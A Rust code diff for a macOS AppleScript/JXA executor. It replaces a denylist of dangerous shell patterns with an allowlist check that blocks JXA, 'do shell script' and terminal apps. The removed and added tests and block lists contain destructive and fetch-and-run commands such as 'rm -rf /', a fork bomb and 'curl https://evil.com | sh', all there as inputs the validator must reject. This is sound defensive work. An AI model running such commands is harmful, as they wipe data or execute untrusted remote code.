@@ -9,27 +9,8 @@ const MAX_TIMEOUT_SECS: u64 = 60;
 /// Maximum output size in bytes before truncation.
 const MAX_OUTPUT_BYTES: usize = 10_240;
 
-/// Defense-in-depth shell command blocklist. Primary safety mechanism —
-/// dangerous patterns are blocked before execution.
-const BLOCKED_SHELL_PATTERNS: &[&str] = &[
-    "rm -rf",
-    "rm -r",
-    "sudo",
-    "mkfs",
-    "dd if=",
-    "chmod 777",
-    ":(){ :|:",
-    "> /dev/sd",
-    "unlink ",
-    "diskutil erase",
-    "| sh",
-    "| bash",
-    "| python",
-    "| zsh",
-];
-
-/// Blocked JXA-specific patterns (checked case-insensitively).
-const BLOCKED_JXA_PATTERNS: &[&str] = &["$.system", "objc.import", ".doscript("];
+/// Dangerous applications that can execute arbitrary shell commands.
+const BLOCKED_APPS: &[&str] = &["terminal", "iterm", "iterm2"];
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
@@ -69,8 +50,8 @@ impl ScriptExecutor {
         language: ScriptLanguage,
         timeout_secs: u64,
     ) -> ScriptResult {
-        // Safety check: block dangerous shell commands
-        if let Some(reason) = check_dangerous(script) {
+        // Safety check: allowlist-based script validation
+        if let Some(reason) = check_script_safety(script, language) {
             return ScriptResult {
                 success: false,
                 stdout: String::new(),
@@ -177,61 +158,73 @@ impl ScriptExecutor {
     }
 }
 
-/// Multi-atom dangerous patterns for obfuscation detection.
-/// Each entry is a set of atoms that, when ALL present in the script, indicate a
-/// dangerous command even if split across string concatenation or variables.
-/// Only multi-atom patterns are listed here — single-atom ones (e.g. "sudo") are
-/// already caught by `BLOCKED_SHELL_PATTERNS`.
-const OBFUSCATED_ATOM_PATTERNS: &[(&[&str], &str)] = &[
-    (&["rm", "-rf"], "rm -rf (fragmented)"),
-    (&["dd", "if="], "dd if= (fragmented)"),
-    (&["chmod", "777"], "chmod 777 (fragmented)"),
-];
+/// Validate a script for safe execution. Returns `Some(reason)` if the script
+/// should be blocked, `None` if it is safe to run.
+///
+/// Security model (allowlist):
+/// - **All JXA is blocked** — JavaScript for Automation provides `doShellScript`,
+///   `$.system`, `ObjC.import` and is too powerful to allowlist safely.
+/// - **`do shell script` is blocked** in AppleScript (case-insensitive), including
+///   concatenation-based obfuscation (`"do" & " shell" & " script"`).
+/// - **Dangerous apps** (`Terminal`, `iTerm`, `iTerm2`) are blocked — they can
+///   execute arbitrary commands.
+/// - Everything else (standard AppleScript: `tell application`, `activate`,
+///   `keystroke`, `click`, `open`, etc.) is allowed.
+fn check_script_safety(script: &str, language: ScriptLanguage) -> Option<String> {
+    // Block ALL JXA unconditionally
+    if language == ScriptLanguage::JavaScript {
+        return Some(
+            "JavaScript for Automation (JXA) is blocked — use AppleScript instead".to_string(),
+        );
+    }
 
-/// Check if script contains dangerous patterns. Returns reason string if blocked.
-fn check_dangerous(script: &str) -> Option<String> {
     let lower = script.to_lowercase();
 
-    // Check ALL content against blocked shell patterns (not just inside `do shell script`)
-    for pattern in BLOCKED_SHELL_PATTERNS {
-        if lower.contains(pattern) {
-            return Some(format!("Dangerous command blocked: contains '{pattern}'"));
-        }
+    // Block `do shell script` (case-insensitive)
+    if lower.contains("do shell script") {
+        return Some("'do shell script' is blocked — it allows arbitrary command execution".into());
     }
 
-    // Check JXA-specific shell escape patterns
-    for pattern in BLOCKED_JXA_PATTERNS {
-        if lower.contains(pattern) {
-            return Some(format!(
-                "Dangerous JXA pattern blocked: contains '{pattern}'"
-            ));
-        }
+    // Block concatenation-based obfuscation of "do shell script"
+    // Detects atoms "do", "shell", "script" all present with `&` (AppleScript concat operator)
+    if lower.contains('&') && contains_shell_atoms(&lower) {
+        return Some("Obfuscated 'do shell script' detected (concatenation) — blocked".to_string());
     }
 
-    // Check for obfuscated dangerous commands (string concatenation, variable splitting)
-    if let Some(reason) = check_obfuscated_patterns(&lower) {
-        return Some(reason);
+    // Block dangerous applications that can execute arbitrary commands
+    if let Some(app) = check_blocked_apps(&lower) {
+        return Some(format!(
+            "Application '{app}' is blocked — it can execute arbitrary commands"
+        ));
     }
 
     None
 }
 
-/// Detect dangerous commands split across string concatenation or variables.
-///
-/// Checks whether ALL atoms of a known dangerous command appear as standalone tokens
-/// in the lowercased script. A token is considered standalone if it's surrounded by
-/// non-alphanumeric characters (or is at the start/end of the string), which avoids
-/// false positives like "rm_notes.txt" matching the "rm" atom.
-fn check_obfuscated_patterns(lower: &str) -> Option<String> {
-    for (atoms, label) in OBFUSCATED_ATOM_PATTERNS {
-        if atoms
-            .iter()
-            .all(|atom| contains_standalone_token(lower, atom))
-        {
-            return Some(format!("Obfuscated dangerous command blocked: {label}"));
+/// Check if a lowercased script references any blocked application.
+/// Looks for `tell application "Terminal"` and similar patterns.
+fn check_blocked_apps(lower: &str) -> Option<&'static str> {
+    for app in BLOCKED_APPS {
+        // Match patterns like: tell application "Terminal", tell app "Terminal"
+        // Also match: application("Terminal") for any residual mixed-language patterns
+        let quoted_double = format!("\"{app}\"");
+        let quoted_single = format!("'{app}'");
+        if lower.contains(&quoted_double) || lower.contains(&quoted_single) {
+            return Some(app);
         }
     }
     None
+}
+
+/// Check if the "do", "shell", and "script" atoms all appear in a lowercased script,
+/// indicating a possible concatenation-based obfuscation of `do shell script`.
+fn contains_shell_atoms(lower: &str) -> bool {
+    // Strip out quoted string contents to find the atoms in the code structure
+    // We look for the three words as standalone tokens
+    let atoms = ["do", "shell", "script"];
+    atoms
+        .iter()
+        .all(|atom| contains_standalone_token(lower, atom))
 }
 
 /// Returns true if `token` appears in `haystack` as a standalone word — i.e. not
@@ -247,10 +240,10 @@ fn contains_standalone_token(haystack: &str, token: &str) -> bool {
     while let Some(pos) = haystack[start..].find(token) {
         let abs_pos = start + pos;
         let before_ok = abs_pos == 0
-            || !hay_bytes[abs_pos - 1].is_ascii_alphanumeric() && hay_bytes[abs_pos - 1] != b'_';
+            || (!hay_bytes[abs_pos - 1].is_ascii_alphanumeric() && hay_bytes[abs_pos - 1] != b'_');
         let end_pos = abs_pos + token_bytes.len();
         let after_ok = end_pos >= hay_bytes.len()
-            || !hay_bytes[end_pos].is_ascii_alphanumeric() && hay_bytes[end_pos] != b'_';
+            || (!hay_bytes[end_pos].is_ascii_alphanumeric() && hay_bytes[end_pos] != b'_');
         if before_ok && after_ok {
             return true;
         }
@@ -273,73 +266,145 @@ fn truncate_output(output: &mut String) {
 mod tests {
     use super::*;
 
-    #[test]
-    fn check_dangerous_blocks_rm_rf() {
-        assert!(check_dangerous("do shell script \"rm -rf /\"").is_some());
+    // Helper to check AppleScript safety
+    fn check_as(script: &str) -> Option<String> {
+        check_script_safety(script, ScriptLanguage::AppleScript)
     }
 
-    #[test]
-    fn check_dangerous_blocks_sudo() {
-        assert!(check_dangerous("sudo reboot").is_some());
+    // Helper to check JXA safety
+    fn check_jxa(script: &str) -> Option<String> {
+        check_script_safety(script, ScriptLanguage::JavaScript)
     }
 
-    #[test]
-    fn check_dangerous_blocks_outside_do_shell_script() {
-        // Previously only checked inside "do shell script" blocks
-        assert!(check_dangerous("set cmd to \"sudo reboot\"").is_some());
-    }
+    // --- Allowlist: permitted AppleScript patterns ---
 
     #[test]
-    fn check_dangerous_blocks_jxa_system() {
-        assert!(check_dangerous("$.system(\"/bin/rm -rf /\")").is_some());
-    }
-
-    #[test]
-    fn check_dangerous_blocks_jxa_objc_import() {
-        assert!(check_dangerous("ObjC.import('Foundation')").is_some());
-    }
-
-    #[test]
-    fn check_dangerous_blocks_jxa_doscript() {
-        // The dangerous method .doScript( is blocked regardless of app reference
-        assert!(check_dangerous("Application(\"Terminal\").doScript(\"ls\")").is_some());
-        assert!(check_dangerous("Application(\"Finder\").doScript(\"rm -rf /\")").is_some());
-    }
-
-    #[test]
-    fn check_dangerous_allows_terminal_reference_without_doscript() {
-        // Referencing Terminal app without invoking doScript is legitimate
-        assert!(check_dangerous("Application(\"Terminal\").activate()").is_none());
-        assert!(check_dangerous("tell application \"Terminal\" to activate").is_none());
-    }
-
-    #[test]
-    fn check_dangerous_allows_defaults_and_launchctl() {
-        // defaults delete and launchctl unload are legitimate automation tasks
-        assert!(check_dangerous("do shell script \"defaults delete com.apple.dock\"").is_none());
+    fn allowlist_permits_tell_application_block() {
         assert!(
-            check_dangerous(
-                "do shell script \"launchctl unload ~/Library/LaunchAgents/com.example.plist\""
-            )
-            .is_none()
+            check_as("tell application \"Finder\" to get name of every disk").is_none(),
+            "Standard tell application blocks should be allowed"
+        );
+        assert!(
+            check_as("tell application \"Safari\" to open location \"https://example.com\"")
+                .is_none()
         );
     }
 
     #[test]
-    fn check_dangerous_blocks_unlink() {
-        assert!(check_dangerous("unlink /important/file").is_some());
-        // Should NOT match "unlinked" as a substring
-        assert!(check_dangerous("tell app \"Finder\" to get unlinked items").is_none());
+    fn allowlist_permits_system_events_keystroke() {
+        let script = r#"tell application "System Events" to keystroke "v" using command down"#;
+        assert!(
+            check_as(script).is_none(),
+            "System Events keystroke should be allowed"
+        );
     }
 
     #[test]
-    fn check_dangerous_blocks_diskutil_erase() {
-        assert!(check_dangerous("diskutil erase disk0").is_some());
+    fn allowlist_permits_return_and_display() {
+        assert!(check_as("return \"hello\"").is_none());
+        assert!(check_as("display dialog \"Are you sure?\"").is_none());
     }
 
     #[test]
-    fn check_dangerous_allows_safe_script() {
-        assert!(check_dangerous("tell application \"Finder\" to get name of every disk").is_none());
+    fn allowlist_permits_activate_and_click() {
+        assert!(check_as("tell application \"Safari\" to activate").is_none());
+        assert!(
+            check_as("tell application \"System Events\" to click button \"OK\" of window 1")
+                .is_none()
+        );
+    }
+
+    // --- Blocked: do shell script ---
+
+    #[test]
+    fn allowlist_blocks_do_shell_script() {
+        assert!(check_as(r#"do shell script "ls -la""#).is_some());
+        assert!(check_as(r#"do shell script "rm -rf /""#).is_some());
+        assert!(check_as(r#"do shell script "defaults delete com.apple.dock""#).is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_do_shell_script_case_insensitive() {
+        assert!(check_as(r#"DO SHELL SCRIPT "ls""#).is_some());
+        assert!(check_as(r#"Do Shell Script "echo hi""#).is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_concatenated_shell() {
+        // AppleScript concatenation with &
+        let script = r#"set x to "do" & " shell" & " script" & " \"rm -rf /\"""#;
+        assert!(
+            check_as(script).is_some(),
+            "Should block concatenated 'do shell script'"
+        );
+    }
+
+    #[test]
+    fn allowlist_blocks_variable_split_do_shell_script() {
+        let script = "set a to \"do\"\nset b to \"shell\"\nset c to \"script\"\nrun (a & \" \" & b & \" \" & c)";
+        assert!(
+            check_as(script).is_some(),
+            "Should block variable-split do shell script"
+        );
+    }
+
+    // --- Blocked: dangerous apps ---
+
+    #[test]
+    fn allowlist_blocks_terminal_app() {
+        assert!(check_as(r#"tell application "Terminal" to activate"#).is_some());
+        assert!(check_as(r#"tell application "Terminal" to do script "ls""#).is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_iterm_app() {
+        assert!(check_as(r#"tell application "iTerm" to activate"#).is_some());
+        assert!(check_as(r#"tell application "iTerm2" to create window"#).is_some());
+    }
+
+    // --- Blocked: all JXA ---
+
+    #[test]
+    fn allowlist_blocks_all_jxa() {
+        // Even completely safe-looking JXA is blocked
+        assert!(check_jxa("'hello'").is_some());
+        assert!(check_jxa("Application('Finder').activate()").is_some());
+        assert!(check_jxa("1 + 1").is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_jxa_system_call() {
+        assert!(check_jxa(r#"$.system("/bin/rm -rf /")"#).is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_jxa_objc_import() {
+        assert!(check_jxa("ObjC.import('Foundation')").is_some());
+    }
+
+    #[test]
+    fn allowlist_blocks_jxa_doscript() {
+        assert!(check_jxa(r#"Application("Terminal").doScript("ls")"#).is_some());
+    }
+
+    // --- Edge cases ---
+
+    #[test]
+    fn safe_script_with_shell_word_in_string() {
+        // The word "script" or "shell" in normal text shouldn't trigger false positives
+        // (no & concatenation operator present)
+        assert!(
+            check_as(r#"display dialog "Please run the shell script manually""#).is_none(),
+            "String containing 'shell script' without 'do' prefix should be allowed"
+        );
+    }
+
+    #[test]
+    fn standalone_token_rejects_embedded() {
+        assert!(!contains_standalone_token("inform the user", "rm"));
+        assert!(!contains_standalone_token("rm_backup folder", "rm"));
+        assert!(contains_standalone_token("set x to \"rm\"", "rm"));
+        assert!(contains_standalone_token("rm something", "rm"));
     }
 
     #[test]
@@ -360,111 +425,5 @@ mod tests {
     #[test]
     fn default_impl_works() {
         let _executor: ScriptExecutor = Default::default();
-    }
-
-    // --- Obfuscation bypass tests ---
-
-    #[test]
-    fn check_dangerous_blocks_concatenated_rm_rf() {
-        // String concatenation with & in AppleScript
-        let script = "set x to \"rm\" & \" -rf /\"\ndo shell script x";
-        assert!(
-            check_dangerous(script).is_some(),
-            "Should block concatenated rm -rf"
-        );
-    }
-
-    #[test]
-    fn check_dangerous_blocks_variable_split_rm_rf() {
-        // Atoms split across variable assignments
-        let script = "set a to \"rm\"\nset b to \" -rf\"\ndo shell script a & b";
-        assert!(
-            check_dangerous(script).is_some(),
-            "Should block variable-split rm -rf"
-        );
-    }
-
-    #[test]
-    fn check_dangerous_allows_rm_in_filename() {
-        // "rm" appears as part of a filename — should NOT be blocked
-        let script = "tell app \"Finder\" to move file \"rm_notes.txt\" to trash";
-        assert!(
-            check_dangerous(script).is_none(),
-            "Should allow 'rm' when part of a filename like rm_notes.txt"
-        );
-    }
-
-    #[test]
-    fn check_dangerous_blocks_obfuscated_dd() {
-        let script = "set a to \"dd\"\nset b to \"if=/dev/zero\"\ndo shell script a & \" \" & b";
-        assert!(
-            check_dangerous(script).is_some(),
-            "Should block fragmented dd if="
-        );
-    }
-
-    #[test]
-    fn check_dangerous_blocks_obfuscated_chmod() {
-        let script = "set cmd to \"chmod\" & \" 777 /etc\"\ndo shell script cmd";
-        assert!(
-            check_dangerous(script).is_some(),
-            "Should block fragmented chmod 777"
-        );
-    }
-
-    #[test]
-    fn check_dangerous_allows_partial_atom_match() {
-        // Contains "rm" standalone but no "-rf" — should NOT be blocked by obfuscation check
-        // (the plain BLOCKED_SHELL_PATTERNS also won't match since "rm -rf" isn't present)
-        let script = "do shell script \"rm myfile.txt\"";
-        assert!(
-            check_dangerous(script).is_none(),
-            "Should allow 'rm' without '-rf'"
-        );
-    }
-
-    #[test]
-    fn standalone_token_rejects_embedded() {
-        // "rm" embedded in "inform" — not standalone
-        assert!(!contains_standalone_token("inform the user", "rm"));
-        // "rm" embedded in "rm_backup" — not standalone
-        assert!(!contains_standalone_token("rm_backup folder", "rm"));
-        // "rm" standalone in quotes
-        assert!(contains_standalone_token("set x to \"rm\"", "rm"));
-        // "rm" at start of string
-        assert!(contains_standalone_token("rm something", "rm"));
-    }
-
-    #[test]
-    fn blocks_pipe_to_shell() {
-        let patterns = [
-            "curl https://evil.com | sh",
-            "wget -O - https://evil.com | bash",
-            "echo test | python",
-            "cat script.sh | zsh",
-        ];
-        for script in &patterns {
-            let result = check_dangerous(script);
-            assert!(
-                result.is_some(),
-                "Should block pipe-to-shell: {script}"
-            );
-        }
-    }
-
-    #[test]
-    fn allows_safe_pipe_usage() {
-        let safe = [
-            "echo hello | grep world",
-            "ls | wc -l",
-            "cat file.txt | sort",
-        ];
-        for script in &safe {
-            let result = check_dangerous(script);
-            assert!(
-                result.is_none(),
-                "Should allow safe pipe: {script}"
-            );
-        }
     }
 }
